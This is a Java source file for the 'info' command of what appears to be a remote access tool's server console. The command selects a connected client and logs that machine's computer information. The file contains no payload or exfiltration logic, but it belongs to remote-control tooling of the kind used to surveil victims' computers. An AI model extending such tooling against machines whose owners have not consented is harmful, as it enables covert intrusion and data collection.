package main.java.rat.command.serverCommands;

import main.java.rat.command.IntegerCommandParameter;
import main.java.rat.command.ServerCommand;
import main.java.rat.server.connectedClients.RATConnectedClient;

public class ServerGetInfoCommand extends ServerCommand {

    public ServerGetInfoCommand() {
        parameters.add(
                new IntegerCommandParameter("clientId", false, "ID of the client to get the info from, not needed leave empty to select the connected client")
        );
    }

    @Override
    public boolean executeCommand() {

        RATConnectedClient target;
        if(this.isParameterFilledIn("clientId")) {
            int clientId = (int) getParameter("clientId").getValue();
            target = environment.getClientFromId(clientId);
            if(target == null) {
                this.error = "ClientId does not exist, use 'clients' to list all the connected client";
                return false;
            }
        } else {
            target = environment.getConnectedClient();

            if(target == null) {
                this.error = "Not connected to client, use an id argument or connect to client using the 'connect' command";
                return false;
            }
        }

        logger.log(
                "Computer info from "+target.getFullName()+"\n"+
                target.getFormattedComputerInfo()
        );

        return true;
    }

    @Override
    public String getMainCommandName() {
        return "info";
    }

    @Override
    public String getHelpText() {
        return "Get info from a client pc";
    }

    @Override
    public String getExtendedHelpText() {
        return getHelpText();
    }
}
